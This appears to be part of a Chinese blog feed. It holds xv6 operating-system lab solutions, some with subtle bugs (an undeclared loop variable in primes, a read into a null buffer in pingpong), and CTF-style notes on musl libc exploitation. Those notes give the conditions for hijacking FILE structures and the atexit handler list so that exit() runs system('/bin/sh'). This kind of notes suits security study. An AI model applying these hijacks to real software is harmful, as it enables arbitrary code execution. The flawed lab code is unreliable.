class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, pid);</span><br><span class="line">            write(p[<span class="number">1</span>], <span class="string">&quot;L&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], <span class="string">&quot;H&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><p>有点难度，想了好久，感觉是要用递归，但是没想出来怎么写</p><p>想到在看网课的时候，进入子进程先把 <code>close(0)</code>，然后 <code>dup(p[1])</code>，也就是把子进程的标准输入改为管道的输入了，这样就容易写递归了</p><p>每次只输出接收到的第一个数，它必然是素数</p><p>当从输入接收不到 prime 的时候 <code>exit(0)</code></p><p>这里注意 <code>dup(p[1])</code> 后要把管道都给关了</p><figure class="highlight c"><figcaption><span>user/primes.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    primes(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, prime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prime = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> n, pid, p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!start &amp;&amp; read(<span class="number">0</span>, &amp;prime, <span class="keyword">sizeof</span>(prime)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printPrime(prime);</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// p[0] =&gt; stdin</span></span><br><span class="line">        close(<span class="number">0</span>);</span><br><span class="line">        dup(p[<span class="number">0</span>]);</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do not need p[1]</span></span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        primes(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(start == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt;= <span class="number">35</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;n, <span class="keyword">sizeof</span>(n))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;n, <span class="keyword">sizeof</span>(n));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// wait for child process</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">exit</span>(status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>同样也是递归，从目录里查找文件可以参考 <code>./user/ls.c</code></p><p>当找的是文件或者时比较名字</p><p>当找的是目录时，从 fd 读取 <code>struct dirent[]</code>，表示目录下的每个文件，里面有 name，表示文件名，注意过滤 <code>.</code> 和 <code>..</code></p><figure class="highlight c"><figcaption><span>user/find.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: invalid arguments\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> status = find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="type">char</span> *name, *p;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (st.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> T_DEVICE:</span><br><span class="line">        <span class="keyword">case</span> T_FILE:</span><br><span class="line">            name = path;</span><br><span class="line">            <span class="comment">// get position of filename</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="built_in">strlen</span>(path) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(path[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    name = &amp;path[i+<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, filename)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if path is directory</span></span><br><span class="line">        <span class="keyword">case</span> T_DIR:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>(path)+<span class="number">1</span>+DIRSIZ+<span class="number">1</span> &gt; <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">            p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">                <span class="comment">// excpet for &quot;.&quot; and &quot;..&quot;</span></span><br><span class="line">                <span class="keyword">if</span>(de.inum == <span class="number">0</span> || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                memmove(p, de.name, DIRSIZ);</span><br><span class="line">                p[DIRSIZ] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                find(buf, filename);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><p>一开始没懂 <code>sh</code> 怎么实现管道</p><p>测试发现就是将管道的读端作为 <code>|</code> 右边程序的标准输入</p><p>主要是判断什么时候跳出循环</p><figure class="highlight c"><figcaption><span>user/xargs.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, pid, new_argc;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line">    <span class="type">char</span> *new_argv[MAXARG];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        new_argv[i<span class="number">-1</span>] = argv[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>)) &#123;</span><br><span class="line">        new_argc = argc;</span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// only read one line each time</span></span><br><span class="line">            <span class="keyword">if</span>(buf == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argv[new_argc] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(buf == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// if meet &#x27; &#x27;, divide into more argv</span></span><br><span class="line">                <span class="comment">// except for two &#x27; &#x27;</span></span><br><span class="line">                <span class="keyword">if</span>(idx == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argc++;</span><br><span class="line">                idx = <span class="number">0</span>;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            new_argv[new_argc<span class="number">-1</span>][idx++] = buf;</span><br><span class="line">        &#125; <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            exec(new_argv[<span class="number">0</span>], new_argv);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong command\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = argc; i &lt;= new_argc; i++) &#123;</span><br><span class="line">            <span class="built_in">free</span>(new_argv[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="写一个-uptime-程序来调用-uptime-系统调用"><a href="#写一个-uptime-程序来调用-uptime-系统调用" class="headerlink" title="写一个 uptime 程序来调用 uptime 系统调用"></a>写一个 uptime 程序来调用 uptime 系统调用</h3><p>直接调用 uptime 然后打印返回值就好了</p><h3 id="对-grep-实现正则匹配"><a href="#对-grep-实现正则匹配" class="headerlink" title="对 grep 实现正则匹配"></a>对 grep 实现正则匹配</h3><p>yysy，对正则表达式不是很了解</p><h3 id="改造-sh"><a href="#改造-sh" class="headerlink" title="改造 sh"></a>改造 sh</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Musl libc Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/</id>
    <published>2022-10-11T08:41:00.000Z</published>
    <updated>2023-03-31T08:03:05.300Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新（或许）</p><span id="more"></span><p>环境：x64 musl-1.2.2</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h3><figure class="highlight c"><figcaption><span>./src/internal/stdio_impl.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相比 glibc 的 FILE 结构，musl libc 的 FILE 结构更加简单，也更容易利用</p><p>有四类 FILE 指针：ofl_head、stdin、stdout、stderr</p><ul><li>ofl_head<ul><li>类似 glibc 的 _IO_list_all，打开的文件链表头，为全局变量</li><li>可以直接劫持到伪造的 FILE 结构</li></ul></li><li>stdin、stdout、stderr<ul><li>固定的三个 FILE 指针，不可劫持</li><li>可以更改其指向的内存空间</li></ul></li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight c"><figcaption><span>./src/stdio/__stdio_exit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>exit()</code> 时会调用 <code>__stdio_exit()</code> ，其中 <code>close_file()</code> 会调用 FILE 的两个函数 <code>write</code> 和 <code>seek</code></p><p>FSOP 条件</p><ul><li>f-&gt;lock == 0<ul><li>不为 0 会调用 futex 系统调用，然后寄了</li></ul></li><li>flags == “/bin/sh\x00”<ul><li>调用的第一个参数都是 FILE 指针，在劫持为 <code>system</code> 时，将 flags 改为 <code>/bin/sh\x00</code> 即可</li></ul></li><li>调用 write<ul><li>wpo != wbase</li></ul></li><li>调用 seek<ul><li>rpos != rend</li></ul></li></ul><h2 id="exit-hijack"><a href="#exit-hijack" class="headerlink" title="exit hijack"></a>exit hijack</h2><p>🐧师傅提及的</p><p>笔者自己起的名（</p><figure class="highlight c"><figcaption><span>./src/exit/atexit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> COUNT 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fl</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*f[COUNT])(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *a[COUNT];</span><br><span class="line">&#125; builtin, *head;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> slot;</span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> *<span class="type">const</span> __atexit_lockptr = lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __funcs_on_exit()</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> (*func)(<span class="type">void</span> *), *arg;</span><br><span class="line">LOCK(lock);</span><br><span class="line"><span class="keyword">for</span> (; head; head=head-&gt;next, slot=COUNT) <span class="keyword">while</span>(slot--&gt;<span class="number">0</span>) &#123;</span><br><span class="line">func = head-&gt;f[slot];</span><br><span class="line">arg = head-&gt;a[slot];</span><br><span class="line">UNLOCK(lock);</span><br><span class="line">func(arg);</span><br><span class="line">LOCK(lock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>exit</code>() 时，会调用 <code>__funs_on_exit()</code> 通过 head 指针执行注册的终止函数</p><p>利用条件</p><ul><li>将 head 劫持到可控内存空间<ul><li>第一个循环因为 slot == 0，会直接跳过</li><li>从而 head  = head-&gt;next</li></ul></li><li>*(head-&gt;next + 0x100) ==  addr_system</li><li>*(head-&gt;next + 0x200) == 